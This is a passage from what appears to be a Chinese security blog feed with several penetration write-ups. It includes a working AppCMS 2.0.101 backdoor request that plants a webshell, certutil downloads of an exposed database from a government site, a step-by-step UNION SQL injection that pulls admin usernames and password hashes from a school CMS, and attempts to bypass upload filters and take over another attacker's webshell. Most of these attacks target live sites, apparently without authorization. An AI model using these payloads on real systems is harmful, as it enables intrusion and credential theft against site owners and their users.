src="/images/20171220_%E4%B8%80%E4%B8%AA%E9%A1%B9%E7%9B%AE%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E8%91%A9%E7%AB%99%E7%82%B9/08.png" alt="一个项目中遇到的奇葩站点"></p><p>这里用win自带的命令将其下载下来。</p><p><code>certutil -urlcache -split -f http://www.xxx.gov.cn/xxx.mdb/.php</code></p><p><img src="/images/20171220_%E4%B8%80%E4%B8%AA%E9%A1%B9%E7%9B%AE%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E8%91%A9%E7%AB%99%E7%82%B9/09.png" alt="一个项目中遇到的奇葩站点"></p><p>将文件名修改为mdb，然后用破障打开找密码，却发现。。。。里面没密码。</p><p><img src="/images/20171220_%E4%B8%80%E4%B8%AA%E9%A1%B9%E7%9B%AE%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E8%91%A9%E7%AB%99%E7%82%B9/10.png" alt="一个项目中遇到的奇葩站点"></p><p>算了，利用此方法可以看到很多源代码。60个站点50个有狗，玩个锤子，有洞就不错了。这算个高危吧！！！就不继续深入了。</p>]]></content>
    
    
    <categories>
      
      <category>原创文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透实战</tag>
      
      <tag>原创文章</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AppCMS 2.0.101 后门分析</title>
    <link href="/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/AppCMS-2-0-101-%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90.html"/>
    <url>/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/AppCMS-2-0-101-%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90.html</url>
    
    <content type="html"><![CDATA[<h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><blockquote><p>下载地址：<a href="http://www.appcms.cc/html/gengxin.html">http://www.appcms.cc/html/gengxin.html</a></p></blockquote><p>![AppCMS 2.0.101 后门分析](/images/20171218_AppCMS 2.0.101 后门分析/01.png)</p><p>官方的更新时间是 2015-8-1</p><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>用beyond compare比较与前一个版本的区别</p><a id="more"></a><p>![AppCMS 2.0.101 后门分析](/images/20171218_AppCMS 2.0.101 后门分析/02.png)</p><p>可以发现，在 templates/m/ 文件夹下出现了一个 content_list.php 文件，修改时间为 2017年5月25日。</p><p>![AppCMS 2.0.101 后门分析](/images/20171218_AppCMS 2.0.101 后门分析/03.png)</p><p>经过解密，<code>9c224bc6b59179729b15e1dddcbb5c82</code>为字符串<code>kejishidai</code>的md5值。</p><p>由代码知，这里存在一个copy函数构成的后门。</p><p>在第12行，实际执行的即为:</p><pre><code class="hljs php">copy(trim(<span class="hljs-variable">$_GET</span>[url]),<span class="hljs-variable">$_GET</span>[cms]);</code></pre><p>将参数url设置为<code>php://input</code>，参数cms设置为shell的文件名，然后POST传入webshell。如下：</p><pre><code class="hljs php">http:<span class="hljs-comment">//127.0.0.1:2500/appcms/appcms_2.0.101/templates/m/content_list.php?session=kejishidai&amp;url=php://input&amp;cms=temp.php</span>POST:<span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span></code></pre><p>![AppCMS 2.0.101 后门分析](/images/20171218_AppCMS 2.0.101 后门分析/04.png)</p><p>接着访问：</p><p><code>http://127.0.0.1:2500/appcms/appcms_2.0.101/templates/m/temp.php</code></p><p>![AppCMS 2.0.101 后门分析](/images/20171218_AppCMS 2.0.101 后门分析/05.png)</p><p>getshell。</p><h1 id="建议"><a href="#建议" class="headerlink" title="建议"></a>建议</h1><p>删除 templates/m/ 文件夹下的content_list.php。</p><p>转载自：<a href="https://chybeta.github.io/">https://chybeta.github.io</a>，</p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
      <tag>App CMS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>意外性的发现一套cms的注入漏洞</title>
    <link href="/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html"/>
    <url>/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html</url>
    
    <content type="html"><![CDATA[<p>事情是这样的，在一个老司机的群里聊天。。。。（是真的开车群）一个朋友说想叫我去检测下他们学校官网。</p><p><img src="/images/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/01.png" alt="意外性的发现一套cms的注入漏洞"></p><p>我这么菜，还是去看看吧。。。。打开主站</p><p> <img src="/images/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/02.png" alt="意外性的发现一套cms的注入漏洞"></p><p>访问robots.txt文件，是存在的，可以看出是isite的cms（在此之前听都没听过….）</p><a id="more"></a><p> <img src="/images/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/03.png" alt="意外性的发现一套cms的注入漏洞"></p><p>去百度了下看下有啥公开的漏洞吧</p><p> <img src="/images/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/04.png" alt="意外性的发现一套cms的注入漏洞"></p><p>不得不说。。。用的人真的少，这些漏洞都试了下，都没用啊。</p><p>还是看看后台吧，后面加个admin，得到后台之，各种弱口令，都没结果。</p><p> <img src="/images/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/05.png" alt="意外性的发现一套cms的注入漏洞"></p><p>竟然这样，从旁站下手好了。查了下，有这么多</p><p> <img src="/images/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/06.png" alt="意外性的发现一套cms的注入漏洞"></p><p>我一个个找过去……全是这套程序。。我也很无奈啊</p><p> <img src="/images/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/07.png" alt="意外性的发现一套cms的注入漏洞"></p><p>没办法，硬着头皮看了看主站，随便点了个连接貌似伪静态啊。试了半天还是放弃了。</p><p> <img src="/images/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/08.png" alt="意外性的发现一套cms的注入漏洞"></p><p>继续翻其他站，在一个站的首页发现这个。</p><p> <img src="/images/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/09.png" alt="意外性的发现一套cms的注入漏洞"></p><p>尝试下post注入。加个单引号</p><p> <img src="/images/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/10.png" alt="意外性的发现一套cms的注入漏洞"></p><p>好吧 刚准备放弃….过了几秒钟 自动跳转到到了另一个页面</p><p> <img src="/images/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/11.png" alt="意外性的发现一套cms的注入漏洞"></p><p>继续在搜索框那输入了些查询内容点击检索</p><p>  <img src="/images/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/12.png" alt="意外性的发现一套cms的注入漏洞"></p><p>  <img src="/images/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/13.png" alt="意外性的发现一套cms的注入漏洞"></p><p>Search后面多了个24，怪我手贱去加个个单引号………报错了（头一次人品爆发）</p><p>  <img src="/images/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/14.png" alt="意外性的发现一套cms的注入漏洞"></p><p>And 1=1 和and 1=2返回结果</p><p>  <img src="/images/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/15.png" alt="意外性的发现一套cms的注入漏洞"></p><p>  <img src="/images/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/16.png" alt="意外性的发现一套cms的注入漏洞"></p><p>确定已经存在注入，这次就用手工注入吧。</p><p>先order by猜下字段长度</p><p><a href="http://www.xxx.com/index.php/iss/search/search/24%20order%20by%2010">http://www.xxx.com/index.php/iss/search/search/24%20order%20by%2010</a>  返回正常</p><p><a href="http://www.xxx.com/index.php/iss/search/search/24%20order%20by%2011">http://www.xxx.com/index.php/iss/search/search/24%20order%20by%2011</a> 返回错误</p><p><a href="http://www.xxx.com/index.php/iss/search/search/24%20union%20select%201,2,3,4,5,6,7,8,9,10">http://www.xxx.com/index.php/iss/search/search/24%20union%20select%201,2,3,4,5,6,7,8,9,10</a>结果如下</p><p>  <img src="/images/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/17.png" alt="意外性的发现一套cms的注入漏洞"></p><p>没有显错位啊，加个and 1=2试试</p><p>  <img src="/images/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/18.png" alt="意外性的发现一套cms的注入漏洞"></p><p>显错位替换成database()和version()，版本是5.0以上，有个默认数据库information</p><p>   <img src="/images/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/19.png" alt="意外性的发现一套cms的注入漏洞"></p><p>User(),不是root权限</p><p>   <img src="/images/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/20.png" alt="意外性的发现一套cms的注入漏洞"></p><p>接下来查表名</p><p><a href="http://www.xxx.com/index.php/iss/search/search/24%20and%201=2%20union%20select%201,group_concat(table_name),3,4,5,6,7,8,9,10%20from%20information_schema.tables%20where%20table_schema=0x6462xxxxxxxxxxx70696E6B5F636F6D">http://www.xxx.com/index.php/iss/search/search/24%20and%201=2%20union%20select%201,group_concat(table_name),3,4,5,6,7,8,9,10%20from%20information_schema.tables%20where%20table_schema=0x6462xxxxxxxxxxx70696E6B5F636F6D</a>(这是数据库的hex码，xxx代表马赛克……)</p><p>​    <img src="/images/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/21.png" alt="意外性的发现一套cms的注入漏洞"></p><p>出来很多啊，用审查元素全部复制下来</p><p>flexi_announcement,flexi_bbcode,flexi_channel,flexi_channel_config,flexi_config,flexi_content,flexi_content_subject,flexi_feedback,flexi_file,flexi_file_watermark,flexi_inquiry,flexi_link,flexi_link_category,flexi_log,flexi_message,flexi_page,flexi_search_cache,flexi_tag,flexi_tag_related,flexi_tpl_block,flexi_user,flexi_user_admin,flexi_u</p><p>起初以为是flexi_user_admin这个表，后来发现帐号密码存在flexi_user这个表中</p><p>接下来查他字段</p><p><a href="http://www.xxx.com/index.php/iss/search/search/24%20and%201=2%20union%20select%201,group_concat(column_name),3,4,5,6,7,8,9,10%20from%20information_schema.columns%20where%20table_name=0x666C6578695F75736572">http://www.xxx.com/index.php/iss/search/search/24%20and%201=2%20union%20select%201,group_concat(column_name),3,4,5,6,7,8,9,10%20from%20information_schema.columns%20where%20table_name=0x666C6578695F75736572</a></p><p>​    <img src="/images/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/22.png" alt="意外性的发现一套cms的注入漏洞"></p><p>id,name,password,hit_question,hit_answer,email,real_name,gender,birthday,province,address,post_code,phone_code,mphone_code,group_id,reg_time,last_login_time,last_login_ip,login_count,post_count,manager,locked,new_msg_count,memo</p><p>经验判断存放帐号密码的字段是name和password</p><p><a href="http://www.xxx.com/index.php/iss/search/search/24%20and%201=2%20union%20select%201,name,3,4,5,6,7,password,9,10%20from%20flexi_user">http://www.xxx.com/index.php/iss/search/search/24%20and%201=2%20union%20select%201,name,3,4,5,6,7,password,9,10%20from%20flexi_user</a></p><p>​    <img src="/images/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/23.png" alt="意外性的发现一套cms的注入漏洞"></p><p>就这样，帐号密码已经出来了</p><p>利用构造出来的exp:</p><p><code>index.php/iss/search/search/24%20and%201=2%20union%20select%201,name,3,4,5,6,7,pass word,9,10%20from%20flexi_user</code></p><p>去主站访问下</p><p>​     <img src="/images/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/24.png" alt="意外性的发现一套cms的注入漏洞"></p><p>哈哈  帐号密码到手 数了一下是40位…….然后去百度看了看</p><p>​     <img src="/images/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/25.png" alt="意外性的发现一套cms的注入漏洞"></p><p>………..说是md5的  然后我仔细看了看文章…..屌用都没  我去官网下载了套源码</p><p>查看代码发现是sha1加密</p><p>​     <img src="/images/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/26.png" alt="意外性的发现一套cms的注入漏洞"></p><p>拿起密码就去cmd5.com解密，悲剧来了………</p><p>​     <img src="/images/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/27.png" alt="意外性的发现一套cms的注入漏洞"></p><p>Oh Fuck</p><p>试了试另外一个，也是一样的结果…..</p><p>​     <img src="/images/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/28.png" alt="意外性的发现一套cms的注入漏洞"></p><p>然后看了看其他网站，可能真的人品爆发，有个站解密成功了</p><p>然后登录之。</p><p>​     <img src="/images/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/29.png" alt="意外性的发现一套cms的注入漏洞"></p><p>大概看了看网站后台，在这添加上php</p><p>​     <img src="/images/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/30.png" alt="意外性的发现一套cms的注入漏洞"></p><p>找到个上传文件的地方，感觉shell就在眼前</p><p>​     <img src="/images/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/31.png" alt="意外性的发现一套cms的注入漏洞"></p><p>点击上传发现…………我真是个命苦的人啊</p><p>  <img src="/images/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/32.png" alt="意外性的发现一套cms的注入漏洞"></p><p>只能拿出我苦练多年的打狗大法…….拿起burp抓包</p><p>  <img src="/images/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/33.png" alt="意外性的发现一套cms的注入漏洞"></p><p>在这里构造畸形的http，然后放包，成功上传。（自带滑稽表情）</p><p>  <img src="/images/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/34.png" alt="意外性的发现一套cms的注入漏洞"></p><p>  <img src="/images/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/35.png" alt="意外性的发现一套cms的注入漏洞"></p><p>点击那个放大镜</p><p>  <img src="/images/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/36.png" alt="意外性的发现一套cms的注入漏洞"></p><p>源码暴露了路径也不对劲…….看来不是他真实路径。</p><p>又翻了翻，发现这个，点击检索</p><p>  <img src="/images/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/37.png" alt="意外性的发现一套cms的注入漏洞"></p><p>  <img src="/images/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/38.png" alt="意外性的发现一套cms的注入漏洞"></p><p>看到刚才上传的文件，点击源文件</p><p>路径变成了，多了个下划线…….</p><p><a href="http://www.xxx.com/data/upload/2017-04/08215611_edit._php">http://www.xxx.com/data/upload/2017-04/08215611_edit._php</a></p><p>这个问题卡了我两天，各种姿势都试了，还是没办法绕过。</p><p>所以放弃了。。。。。</p><p>Ps：这个提供这套cms的站点也存在该漏洞</p><p>  <img src="/images/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/39.png" alt="意外性的发现一套cms的注入漏洞"></p>]]></content>
    
    
    <categories>
      
      <category>原创文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透实战</tag>
      
      <tag>原创文章</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>毫无技术含量的一次渗透</title>
    <link href="/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F.html"/>
    <url>/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F.html</url>
    
    <content type="html"><![CDATA[<p>马上就双十一了，发一篇去年双十一写的文章！图片太多，懒得打码了，一年过去了，漏洞没补也不怪我了吧。。。</p><p>事情是这样的，双十一大家都知道，有钱的都在买东西，没钱的都在借钱买东西。像我这种又丑又没钱的只能在聊 QQ……无意间在一个群里看到</p><p><img src="/images/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/01.png" alt="毫无技术含量的一次渗透"></p> <a id="more"></a><p><img src="/images/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/02.png" alt="毫无技术含量的一次渗透"></p><p>反正无聊，随手打开看看吧。</p><p><img src="/images/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/03.png" alt="毫无技术含量的一次渗透"></p><p>看起来是个学校网站啊。说不定有妹子的资料啥的。看到那哥们说有马啥的。我就去打开链接看了看。</p><p><img src="/images/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/04.png" alt="毫无技术含量的一次渗透"></p><p><img src="/images/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/05.png" alt="毫无技术含量的一次渗透"></p><p><img src="/images/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/06.png" alt="毫无技术含量的一次渗透"><br>好好好，你赢了，这都是啥屌东西啊~不过还真找到一个 d.asp 的马</p><p><img src="/images/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/07.png" alt="毫无技术含量的一次渗透"><br>先看看这马能不能溢出吧，毕竟别人的 shell 为啥不能占为己有呢</p><p><img src="/images/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/08.png" alt="毫无技术含量的一次渗透"><br>………溢出失败，还是别偷懒吧，一步步来。回到首页，随便打开一个链接。</p><p><img src="/images/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/09.png" alt="毫无技术含量的一次渗透"><br>直觉告诉我，这屌地方有注入啊，加个‘试试。</p><p><img src="/images/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/10.png" alt="毫无技术含量的一次渗透"><br>果然，报错了…..我也不装逼什么的手工注入了。果断丢进啊 d 神器中，毕竟还要去看片（正经片）。</p><p><img src="/images/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/11.png" alt="毫无技术含量的一次渗透"><br>出来了，丢到 cmd5 去解密看看</p><p><img src="/images/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/12.png" alt="毫无技术含量的一次渗透"><br>穷逼买不起….竟然买不起就先找后台吧….找到以后再借钱去买吧…..<br>Admin 404</p><p><img src="/images/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/13.png" alt="毫无技术含量的一次渗透"></p><p>Login.asp 也是 404，算了，用御剑扫扫吧。</p><p><img src="/images/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/14.png" alt="毫无技术含量的一次渗透"><br>看到前 3 条，有 fck 编辑器。那还是从这下手吧，毕竟能省下解密的钱。<br>看了下版本，是 2.6.6 的</p><p><img src="/images/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/15.png" alt="毫无技术含量的一次渗透"><br>2.6.6 版本的 fck 的上传页面</p><p><img src="/images/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/16.png" alt="毫无技术含量的一次渗透"><br>Ok，先来看看第一个</p><p><img src="/images/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/17.png" alt="毫无技术含量的一次渗透"><br>先查看下目录和文件</p><p><img src="/images/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/18.png" alt="毫无技术含量的一次渗透"><br>当前目录下什么都没有啊<br>然后随便上传一张图片看下能否上传吧。</p><p><img src="/images/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/19.png" alt="毫无技术含量的一次渗透"><br>显示上传没有错误，那就是成功了啊！！！查看下</p><p><img src="/images/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/20.png" alt="毫无技术含量的一次渗透"><br>果然多出了一张图片，看来会自动重命名了，先访问试试</p><p><img src="/images/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/21.png" alt="毫无技术含量的一次渗透"><br>可以正常访问的，然后嘛，各种截断都没用</p><p><img src="/images/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/22.png" alt="毫无技术含量的一次渗透"><br>去查看服务器信息吧…</p><p><img 